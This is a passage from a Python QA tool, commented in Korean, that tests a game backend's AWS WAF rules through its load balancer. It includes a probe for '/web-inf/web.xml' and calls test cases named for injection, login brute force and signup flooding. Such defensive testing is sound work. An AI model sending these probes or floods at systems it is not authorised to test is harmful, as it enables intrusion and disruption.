        all_blocked = all_blocked and b1

    b_path, _, _ = send_until_blocked("GET", "/web-inf/web.xml", 1, proxies=proxies)
    print(f"      - /web-inf/web.xml: {'차단' if b_path else '통과'}")
    all_blocked = all_blocked and b_path

    report.record("Case 10. 알려진 악성 입력 차단", "PASS" if all_blocked else "FAIL")


def _egress_ip_probe(n=12):
    """동시 연결의 '출발 공인 IP'를 여러 번 확인해 NAT 풀(다중 IP) 여부를 감지한다.
    속도 규칙은 IP별 카운트라, 출발 IP가 여러 개면 카운트가 안 차 미차단(오탐)이 난다.
    반환: 확인된 공인 IP 집합 (확인 실패 시 빈 집합)."""
    endpoints = ["https://checkip.amazonaws.com", "https://api.ipify.org"]

    def _ip(i):
        try:
            r = requests.get(endpoints[i % len(endpoints)], timeout=5)
            return r.text.strip()
        except Exception:
            return None

    ips = set()
    try:
        with ThreadPoolExecutor(max_workers=n) as ex:
            for ip in ex.map(_ip, range(n)):
                if ip:
                    ips.add(ip)
    except Exception:
        pass
    return ips


def _waf_preflight_check():
    """대상(WAF_TARGET_URL)에 연결 가능한지 먼저 확인. 연결 자체가 안 되면 중단.
    백엔드 헬스체크가 5xx면(=ALB 뒤 백엔드 비정상) 경고만 하고 진행한다."""
    try:
        r = requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
    except requests.exceptions.RequestException as e:
        print("\n❌ 대상에 연결할 수 없습니다:", WAF_TARGET_URL)
        print("   이 세션에 WAF_TARGET_URL 환경변수가 설정됐는지 확인하세요.")
        print("   ($env:... 환경변수는 설정한 PowerShell 세션에서만 유효합니다)")
        print("   PowerShell 예:")
        print('     $env:WAF_TARGET_URL="http://<your-alb-dns>"')
        print(f"   상세: {type(e).__name__}")
        return False
    if r.status_code >= 500:
        print(f"\n⚠️  백엔드 헬스체크가 {r.status_code} 입니다 — ALB 뒤 백엔드가 비정상/다운일 수 있습니다.")
        print("    Geo/UA/크기 등 WAF 계층 규칙은 검증되지만, 속도(rate) 케이스는")
        print("    요청이 5xx로 느리게 처리되고 5분 윈도우에 100건이 안 쌓여 부정확해집니다.")
        print("    타깃 그룹 헬스/EC2 기동/앱 실행을 먼저 정상화한 뒤 재실행을 권장합니다.")
    return True


def _waf_run_all() -> bool:
    print("=" * 60)
    print(f"🎯 WAF 테스트 대상: {WAF_TARGET_URL}")
    if WAF_TARGET_URL == BASE_URL:
        print("⚠️  WAF_TARGET_URL이 BASE_URL과 동일합니다. ALB(WAF) 주소인지 확인하세요.")
    print("ℹ️  본체는 한국(허용국)에서 실행하세요. 속도 규칙은 IP당 5분 100회 기준이라,")
    print("    직전 실행으로 IP가 차단된 상태면 결과가 왜곡됩니다. 약 5분 경과 후 1회 실행을 권장합니다.")
    print("    (속도 케이스는 WAF 평가 지연 때문에 케이스당 수십 초~2분이 걸릴 수 있습니다.)")
    print("=" * 60)

    if not _waf_preflight_check():
        return False

    _sys_proxy = (os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
                  or os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
                  or os.environ.get("ALL_PROXY") or os.environ.get("all_proxy"))
    if _sys_proxy:
        print(f"\n⚠️  시스템 프록시 감지: {_sys_proxy}")
        print("    requests의 모든 요청이 이 프록시를 거쳐, 출발 IP가 프록시(풀)로 보입니다.")
        print("    속도(rate) 케이스는 '동일 IP 5분 100건' 기준이라, 프록시 풀이면 카운트가")
        print("    안 차서 미차단(오탐)이 납니다. 속도 케이스는 프록시 없는 단일 공인망")
        print("    (폰 핫스팟/집/EC2)에서 실행을 권장합니다.")

    egress = _egress_ip_probe()
    if len(egress) > 1:
        print(f"\n⚠️  출발 공인 IP가 여러 개로 보입니다: {sorted(egress)}")
        print("    이 네트워크는 NAT 풀/CGNAT일 수 있습니다. WAF 속도 규칙은 '동일 IP 5분 100건'")
        print("    기준이라, IP가 분산되면 카운트가 안 차서 속도 케이스가 미차단(오탐)이 됩니다.")
        print("    → 속도(2/3/6/7) 케이스는 단일 공인 IP 망(집/폰 핫스팟/EC2)에서 실행하세요.")
        print("    (나머지 케이스는 이 네트워크에서도 정상 검증됩니다.)")
    elif len(egress) == 1:
        print(f"ℹ️  출발 공인 IP: {next(iter(egress))} (단일 — 속도 규칙 검증에 적합)")

    report = WafReport()
    token = get_token()
    if not token:
        print("ℹ️  인증 토큰 미확보 — 토큰이 필요한 케이스(2/3)는 401을 거쳐도 속도 규칙 검증은 유효합니다.")

    case_01_geo(report)
    case_02_rate(report, token)
    case_03_rate_progress(report, token)
    case_04_injection(report)
    case_05_size(report)
    case_06_login_bruteforce(report)
    case_07_signup_flood(report)
    case_08_user_agent(report)
    case_09_anonymous_ip(report)
    case_10_known_bad_inputs(report)

    return report.summary()


def run_waf_security_tests() -> bool:
    """WAF 보안 테스트(13케이스) 실행. 대상은 WAF_TARGET_URL(ALB) 환경변수.
    기능 QA(BASE_URL=백엔드)와 달리 ALB(WAF)를 대상으로 한다. (이 파일에 인라인됨)"""
    print("\nℹ️  WAF 보안 테스트는 ALB(WAF) 주소(WAF_TARGET_URL)로 보냅니다.")
    print('   예) PowerShell:  $env:WAF_TARGET_URL="http://<your-alb-dns>"')
    return _waf_run_all()


def main_menu():
    while True:
        print("\n" + "=" * 45)
        print("🛡️ Vamserlike 통합 QA 테스트 툴 (Jang Bros)")
        print("=" * 45)
        print("  1. 전체 테스트 실행 (1~4 시나리오)")
        print("  2. 인증(Auth) 정상 시나리오")
        print("  3. 데이터 무결성(Integrity) 시나리오")
        print("  4. 캐릭터 해금 + bypass-login 시나리오")
        print("  5. 🚨 테스트 데이터 전체 초기화 (reset-test-data)")
        print("  6. 🛡️ WAF 보안 테스트 (ALB/WAF 대상, 13케이스)")
        print("  0. 종료")
        print("-" * 45)

        choice = input("실행할 번호를 선택하세요: ").strip()

        if choice == "1":
            run_all_tests()
        elif choice == "2":
            r = TestReport(); test_auth_happy_path(r); r.summary()
        elif choice == "3":
            r = TestReport(); test_data_integrity(r); r.summary()
        elif choice == "4":
            r = TestReport(); test_bypass_login(r); test_character_unlock(r); r.summary()
        elif choice == "5":
            reset_all_test_data()
        elif choice == "6":
            run_waf_security_tests()
        elif choice == "0":
            print("👋 종료합니다.")
            break
        else:
            print("⚠️ 잘못된 입력입니다.")


if __name__ == "__main__":
    if "--waf" in sys.argv:
        # WAF 보안 테스트 단독 실행 (CI/수동 공용): python QA_Tool_Final.py --waf
        try:
            ok = run_waf_security_tests()
            sys.exit(0 if ok else 1)
        except requests.exceptions.ConnectionError:
            print("\n❌ WAF 대상(WAF_TARGET_URL/ALB)에 연결할 수 없습니다.")
            sys.exit(2)
    elif "--ci" in sys.argv:
        try:
            passed = run_all_tests()
            sys.exit(0 if passed else 1)
        except requests.exceptions.ConnectionError:
            print(f"\n❌ 서버 연결 불가: {BASE_URL}")
            sys.exit(2)
    else:
        try:
            main_menu()
        except requests.exceptions.ConnectionError:
            print(f"\n❌ 에러: {BASE_URL} 서버에 연결할 수 없습니다.")
            print("   백엔드 서버('dotnet run' 등)를 먼저 실행하세요!")
